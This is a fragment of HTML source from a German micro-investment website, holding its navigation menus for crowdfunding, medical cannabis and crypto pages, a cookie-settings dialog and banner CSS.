				</td><td style="width: 10px; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td colspan="21" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Medizinisches-Cannabis/" style="font-size:120%; ">Medizinisches Cannabis</a></td></tr><tr><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Medizinisches-Cannabis/CannerGrow/" style>CannerGrow</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Medizinisches-Cannabis/Juicy-Fields/" style>Juicy Fields</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Medizinisches-Cannabis/MyFirstPlant/" style>MyFirstPlant</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td colspan="21" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/" style="font-size:120%; ">Krypto-Währungen &amp; eWallet</a></td></tr><tr><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/Attiora/" style>Attiora</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/CryptoTab/" style>CryptoTab</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/CakeDEFI/" style>CakeDEFI</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/Coinbase/" style>Coinbase</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/Paraiba/" style>Paraiba</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/Helium-Miner/" style>Helium Miner</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/Yield-Nodes/" style>Yield Nodes</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td colspan="21" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Kontakt/Newsletter/" style="font-size:120%; ">Kontakt / Newsletter</a></td></tr><tr><td></td></tr><tr><td colspan="21" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Impressum/Datenschutz/" style="font-size:120%; ">Impressum/ Datenschutz</a></td></tr><tr><td></td></tr></table></div></div></div><p style="text-align: center;"><br></p><p style="text-align: center;"><br></p><p style="text-align: center;"><br></p><p><br></p><div id="cm_bottom_clearer" style="clear: both;" contenteditable="false"></div></div></div></div></div><div class="cm-templates-footer-container footer_wrapper cm_can_be_empty"><div class="sidebar_wrapper"><div class="cm-templates-sidebar-one"><div class="sidebar cm_can_be_empty" id="widgetbar_site_1" data-cm-hintable="yes"><p style="text-align: center;"><br></p><p>  </p><p> </p><p> </p></div><div class="sidebar cm_can_be_empty" id="widgetbar_site_2" data-cm-hintable="yes"><div id="widgetcontainer_STRATP_cm4all_com_widgets_UroPhoto_36442017" class="
				    cm_widget_block
					cm_widget cm4all_com_widgets_UroPhoto cm_widget_block_center" style="width:93.8%; max-width:707px; "><div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_UroPhoto_36442017" id="widgetanchor_STRATP_cm4all_com_widgets_UroPhoto_36442017"><!--cm4all.com.widgets.UroPhoto--></a></div><div xmlns="http://www.w3.org/1999/xhtml" data-uro-type="image" style="width:100%;height:100%;" id="uroPhotoOuterSTRATP_cm4all_com_widgets_UroPhoto_36442017"><a rel="noreferrer noopener" target="STRATP_cm4all_com_widgets_UroPhoto_36442017" href="http://&lt;iframe" style="border:none"><picture><source srcset="images/jetzt_abmelden_Newsletter-removebg-preview.png 1x, images/jetzt_abmelden_Newsletter-removebg-preview.png 2x" media="(min-width:1300px)"><source srcset="images/jetzt_abmelden_Newsletter-removebg-preview.png 1x, images/jetzt_abmelden_Newsletter-removebg-preview.png 2x" media="(min-width:800px)"><source srcset="images/jetzt_abmelden_Newsletter-removebg-preview.png 1x, images/jetzt_abmelden_Newsletter-removebg-preview.png 2x" media="(min-width:600px)"><source srcset="images/jetzt_abmelden_Newsletter-removebg-preview.png 1x, images/jetzt_abmelden_Newsletter-removebg-preview.png 2x" media="(min-width:400px)"><source srcset="images/jetzt_abmelden_Newsletter-removebg-preview.png 1x, images/jetzt_abmelden_Newsletter-removebg-preview.png 2x" media="(min-width:200px)"><source srcset="picture-200_4 1x, images/jetzt_abmelden_Newsletter-removebg-preview.png 2x" media="(min-width:100px)"><img src="picture-200_4" data-uro-original="/.cm4all/uproc.php/0/jetzt_abmelden_Newsletter-removebg-preview.png?_=17ab0be10a0" onerror="uroGlobal().util.error(this, '', 'uro-widget')" data-uro-width="707" data-uro-height="353" alt style="width:100%;" title loading="lazy"></picture><span></span></a></div></div><p style="text-align: center;"><br></p><p> </p></div><div class="sidebar cm_can_be_empty" id="widgetbar_site_3" data-cm-hintable="yes"><p> </p></div></div><div class="cm-templates-sidebar-two"><div class="sidebar cm_can_be_empty" id="widgetbar_page_1" data-cm-hintable="yes"><p style="text-align: center;"><br></p><p><br></p></div><div class="sidebar cm_can_be_empty" id="widgetbar_page_2" data-cm-hintable="yes"><p> </p></div><div class="sidebar cm_can_be_empty" id="widgetbar_page_3" data-cm-hintable="yes"><p> </p></div></div></div></div><div class="cm-templates-footer cm_can_be_empty" id="footer" data-cm-hintable="yes"> </div></div><div class="content_overlay"> </div><div class="navigation_wrapper_mobile cm_with_forcesub " id="mobile_cm_navigation"><ul id="mobile_cm_mainnavigation"><li id="mobile_cm_navigation_pid_4807477" class="cm_current"><a title="Startseite" href="https://www.mikro-investment.de/Startseite/" class="cm_anchor">Startseite</a></li><li id="mobile_cm_navigation_pid_4973741" class="cm_has_subnavigation"><a title="Crowdfunding" href="https://www.mikro-investment.de/Crowdfunding/" class="cm_anchor">Crowdfunding</a><ul class="cm_subnavigation" id="mobile_cm_subnavigation_pid_4973741"><li id="mobile_cm_navigation_pid_5156788"><a title="Juicy Fields" href="https://www.mikro-investment.de/Crowdfunding/Juicy-Fields/" class="cm_anchor">Juicy Fields</a></li><li id="mobile_cm_navigation_pid_5433542"><a title="Cancri Jewelry GOLD Invest" href="https://www.mikro-investment.de/Crowdfunding/Cancri-Jewelry-GOLD-Invest/" class="cm_anchor">Cancri Jewelry GOLD Invest</a></li><li id="mobile_cm_navigation_pid_5602335"><a title="Yosemite EP " href="https://www.mikro-investment.de/Crowdfunding/Yosemite-EP/" class="cm_anchor">Yosemite EP </a></li></ul></li><li id="mobile_cm_navigation_pid_4973748" class="cm_has_subnavigation"><a title="Medizinisches Cannabis" href="https://www.mikro-investment.de/Medizinisches-Cannabis/" class="cm_anchor">Medizinisches Cannabis</a><ul class="cm_subnavigation" id="mobile_cm_subnavigation_pid_4973748"><li id="mobile_cm_navigation_pid_5156887"><a title="CannerGrow" href="https://www.mikro-investment.de/Medizinisches-Cannabis/CannerGrow/" class="cm_anchor">CannerGrow</a></li><li id="mobile_cm_navigation_pid_5126103"><a title="Juicy Fields" href="https://www.mikro-investment.de/Medizinisches-Cannabis/Juicy-Fields/" class="cm_anchor">Juicy Fields</a></li><li id="mobile_cm_navigation_pid_5197535"><a title="MyFirstPlant" href="https://www.mikro-investment.de/Medizinisches-Cannabis/MyFirstPlant/" class="cm_anchor">MyFirstPlant</a></li></ul></li><li id="mobile_cm_navigation_pid_5065916" class="cm_has_subnavigation"><a title="Krypto-Währungen &amp; eWallet" href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/" class="cm_anchor">Krypto-Währungen &amp; eWallet</a><ul class="cm_subnavigation" id="mobile_cm_subnavigation_pid_5065916"><li id="mobile_cm_navigation_pid_5604600"><a title="Attiora" href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/Attiora/" class="cm_anchor">Attiora</a></li><li id="mobile_cm_navigation_pid_5182061"><a title="CryptoTab" href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/CryptoTab/" class="cm_anchor">CryptoTab</a></li><li id="mobile_cm_navigation_pid_5197536"><a title="CakeDEFI" href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/CakeDEFI/" class="cm_anchor">CakeDEFI</a></li><li id="mobile_cm_navigation_pid_5112720"><a title="Coinbase" href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/Coinbase/" class="cm_anchor">Coinbase</a></li><li id="mobile_cm_navigation_pid_5113550"><a title="Paraiba" href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/Paraiba/" class="cm_anchor">Paraiba</a></li><li id="mobile_cm_navigation_pid_5259730"><a title="Helium Miner" href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/Helium-Miner/" class="cm_anchor">Helium Miner</a></li><li id="mobile_cm_navigation_pid_5156996"><a title="Yield Nodes" href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/Yield-Nodes/" class="cm_anchor">Yield Nodes</a></li></ul></li><li id="mobile_cm_navigation_pid_4974424"><a title="Kontakt / Newsletter" href="https://www.mikro-investment.de/Kontakt/Newsletter/" class="cm_anchor">Kontakt / Newsletter</a></li><li id="mobile_cm_navigation_pid_4807473"><a title="Impressum/ Datenschutz" href="https://www.mikro-investment.de/Impressum/Datenschutz/" class="cm_anchor">Impressum/ Datenschutz</a></li></ul></div><div class="toggle_navigation"><div class="toggle_navigation--background"><div class="burgerline1"> </div><div class="burgerline2"> </div><div class="burgerline3"> </div></div></div>
					
					
					<div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_CookiePolicy_33479355" id="widgetanchor_STRATP_cm4all_com_widgets_CookiePolicy_33479355"><!--cm4all.com.widgets.CookiePolicy--></a></div><div style="display:none" class="cm-wp-container cm4all-cookie-policy-placeholder-template"><div class="cm-wp-header"><h4 class="cm-wp-header__headline">Externe Inhalte</h4><p class="cm-wp-header__text">Die an dieser Stelle vorgesehenen Inhalte können aufgrund Ihrer aktuellen <a class="cm-wp-header__link" href="#" onclick="openCookieSettings();return false;">Cookie-Einstellungen</a> nicht angezeigt werden.</p></div><div class="cm-wp-content"><div class="cm-wp-content__control"><label class="cm-wp-content-switcher"><input type="checkbox" class="cm-wp-content-switcher__checkbox"><span class="cm-wp-content-switcher__label">Drittanbieter-Inhalte</span></label></div><p class="cm-wp-content__text">Diese Webseite bietet möglicherweise Inhalte oder Funktionalitäten an, die von Drittanbietern eigenverantwortlich zur Verfügung gestellt werden. Diese Drittanbieter können eigene Cookies setzen, z.B. um die Nutzeraktivität zu verfolgen oder ihre Angebote zu personalisieren und zu optimieren.</p></div></div><div style="display: none;" id="cookieSettingsDialog" class="cm-cookie-container"><div class="cm-cookie-header"><h4 class="cm-cookie-header__headline">Cookie-Einstellungen</h4><div class="cm-cookie-header__close-button"></div></div><div class="cm-cookie-content"><p class="cm-cookie-content__text">Diese Webseite verwendet Cookies, um Besuchern ein optimales Nutzererlebnis zu bieten. Bestimmte Inhalte von Drittanbietern werden nur angezeigt, wenn "Drittanbieter-Inhalte" aktiviert sind.</p><div class="cm-cookie-content__controls"><div class="cm-cookie-controls-container"><div class="cm-cookie-controls cm-cookie-controls--essential"><div class="cm-cookie-flex-wrapper"><label class="cm-cookie-switch-wrapper"><input id="cookieSettingsEssential" type="checkbox" disabled="disabled" checked="checked"><span></span></label><div class="cm-cookie-expand-wrapper"><span>Technisch notwendige</span><div class="cm-cookie-content-expansion-button"></div></div></div><div class="cm-cookie-content-expansion-text">Diese Cookies sind zum Betrieb der Webseite notwendig, z.B. zum Schutz vor Hackerangriffen und zur Gewährleistung eines konsistenten und der Nachfrage angepassten Erscheinungsbilds der Seite.</div></div><div class="cm-cookie-controls cm-cookie-controls--statistic"><div class="cm-cookie-flex-wrapper"><label class="cm-cookie-switch-wrapper"><input id="cookieSettingsStatistics" type="checkbox"><span></span></label><div class="cm-cookie-expand-wrapper"><span>Analytische</span><div class="cm-cookie-content-expansion-button"></div></div></div><div class="cm-cookie-content-expansion-text">Diese Cookies werden verwendet, um das Nutzererlebnis weiter zu optimieren. Hierunter fallen auch Statistiken, die dem Webseitenbetreiber von Drittanbietern zur Verfügung gestellt werden, sowie die Ausspielung von personalisierter Werbung durch die Nachverfolgung der Nutzeraktivität über verschiedene Webseiten.</div></div><div class="cm-cookie-controls cm-cookie-controls--third-party"><div class="cm-cookie-flex-wrapper"><label class="cm-cookie-switch-wrapper"><input id="cookieSettingsThirdparty" type="checkbox"><span></span></label><div class="cm-cookie-expand-wrapper"><span>Drittanbieter-Inhalte</span><div class="cm-cookie-content-expansion-button"></div></div></div><div class="cm-cookie-content-expansion-text">Diese Webseite bietet möglicherweise Inhalte oder Funktionalitäten an, die von Drittanbietern eigenverantwortlich zur Verfügung gestellt werden. Diese Drittanbieter können eigene Cookies setzen, z.B. um die Nutzeraktivität zu verfolgen oder ihre Angebote zu personalisieren und zu optimieren.</div></div></div><div class="cm-cookie-content-button"><div onclick="selectAllCookieTypes(); setTimeout(saveCookieSettings, 400);" class="cm-cookie-button cm-cookie-content-button--accept-all"><span>Alle akzeptieren</span></div><div onclick="saveCookieSettings();" class="cm-cookie-button cm-cookie-content-button--save"><span>Speichern</span></div></div></div></div></div>
					
			
			
			
			<noscript><div style="position:absolute;bottom:0;" id="statdiv"><img alt height="1" width="1" src="_pixel.img"></div></noscript>
			
		
		
		<div style="display: none;" id="keyvisualWidgetVideosContainer"></div><style type="text/css">.cm-kv-0-1 {
background-color: ;
background-position: 50% 50%;
background-size: 90% auto;
background-repeat: no-repeat;
}
.cm-kv-0-2 {
background-color: ;
background-position: 50% 50%;
background-size: 100% auto;
background-repeat: no-repeat;
}
.cm-kv-0-3 {
background-color: ;
background-position: 50% 50%;
background-size: 90% auto;
background-repeat: no-repeat;
}
@media(min-width: 100px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-1{background-image:url("images/jf-facebook-banner_copy%5B1%5D.png");}}@media(min-width: 100px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-1{background-image:url("images/jf-facebook-banner_copy%5B1%5D.png");}}@media(min-width: 200px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-1{background-image:url("images/jf-facebook-banner_copy%5B1%5D.png");}}@media(min-width: 200px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-1{background-image:url("images/jf-facebook-banner_copy%5B1%5D.png");}}@media(min-width: 400px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-1{background-image:url("images/jf-facebook-banner_copy%5B1%5D.png");}}@media(min-width: 400px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-1{background-image:url("images/jf-facebook-banner_copy%5B1%5D.png");}}@media(min-width: 600px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-1{background-image:url("images/jf-facebook-banner_copy%5B1%5D.png");}}@media(min-width: 600px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-1{background-image:url("images/jf-facebook-banner_copy%5B1%5D.png");}}@media(min-width: 800px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-1{background-image:url("images/jf-facebook-banner_copy%5B1%5D.png");}}@media(min-width: 800px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-1{background-image:url("images/jf-facebook-banner_copy%5B1%5D.png");}}@media(min-width: 100px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-2{background-image:url("images/Banner.png");}}@media(min-width: 100px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-2{background-image:url("images/Banner.png");}}@media(min-width: 200px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-2{background-image:url("images/Banner.png");}}@media(min-width: 200px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-2{background-image:url("images/Banner.png");}}@media(min-width: 400px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-2{background-image:url("images/Banner.png");}}@media(min-width: 400px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-2{background-image:url("images/Banner.png");}}@media(min-width: 600px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-2{background-image:url("images/Banner.png");}}@media(min-width: 600px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-2{background-image:url("images/Banner.png");}}@media(min-width: 800px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-2{background-image:url("images/Banner.png");}}@media(min-width: 800px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-2{background-image:url("images/Banner.png");}}@media(min-width: 100px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-3{background-image:url("images/Cryptotab%20banner%202.jpg");}}@media(min-width: 100px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-3{background-image:url("images/Cryptotab%20banner%202.jpg");}}@media(min-width: 200px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-3{background-image:url("images/Cryptotab%20banner%202.jpg");}}@media(min-width: 200px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-3{background-image:url("images/Cryptotab%20banner%202.jpg");}}@media(min-width: 400px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-3{background-image:url("images/Cryptotab%20banner%202.jpg");}}@media(min-width: 400px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-3{background-image:url("images/Cryptotab%20banner%202.jpg");}}@media(min-width: 600px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-3{background-image:url("images/Cryptotab%20banner%202.jpg");}}@media(min-width: 600px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-3{background-image:url("images/Cryptotab%20banner%202.jpg");}}@media(min-width: 800px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-kv-0-3{background-image:url("images/Cryptotab%20banner%202.jpg");}}@media(min-width: 800px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-kv-0-3{background-image:url("images/Cryptotab%20banner%202.jpg");}}</style><style type="text/css">
			#keyvisual {
				overflow: hidden;
			}
			.kv-video-wrapper {
				width: 100%;
				height: 100%;
				position: relative;
			}
			</style>
			
			</body></html>
